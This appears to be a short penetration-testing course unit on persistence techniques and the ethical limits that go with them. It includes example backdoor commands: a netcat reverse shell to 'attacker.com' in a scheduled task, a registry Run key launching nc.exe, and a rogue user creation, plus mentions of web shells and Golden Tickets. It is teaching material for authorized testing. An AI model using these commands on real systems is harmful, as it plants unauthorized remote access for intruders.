# Persistence Concepts and Ethical Boundaries

## 1. Unit Brief: Leaving a Backdoor
Persistence is planting a way to get back in if the original exploit is patched or the server reboots. In Pentesting, this is often simulated or done with extreme caution.

## 2. Real-World Relevance
*   **Red Team**: Needs to maintain access for weeks to simulate a lingering threat (APT).
*   **Pentest**: Usually DOES NOT use persistence to avoid leaving risky backdoors for real criminals.

## 3. Core Concepts

### Methods
*   **User Creation**: `net user hacker password /add`. (Very Loud).
*   **SSH Keys**: Adding your public key to `~/.ssh/authorized_keys`. (Silent).
*   **Scheduled Tasks**: A script that runs `nc -e /bin/sh attacker.com` every hour.
*   **Web Shells**: Leaving `shell.php` buried in a deep directory.

### Ethical Boundaries
*   **Never** Install a Rootkit (Kernel modification) on a client's production server. It might crash the OS.
*   **Always** document the exact location of every backdoor file.
*   **Clean Up**: If you create a user, you MUST delete it before the report is sent.

## 4. Practical Examples

### Simple Golden Ticket (Persistence)
Creating a Golden Ticket (Forged Kerberos Ticket) allows you to be Domain Admin for 10 years, even if the password changes (`krbtgt` password must change to revoke it).

### Registry Run Keys
`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\Public\nc.exe ...`
*   Every time the user logs in, they connect back to you.

## 5. Common Mistakes Beginners Make
*   **Forgetting your shells**: Leaving a webshell on a bank's server after the contract ends is negligence. Real hackers will find it.
*   **Overwriting system binaries**: Replacing `svchost.exe` is dangerous.

## 6. Key Takeaways
*   **Permission First**: Only establish persistence if explicitly in the Scope.
*   **Log Everything**: You need to be able to remove it 100%.
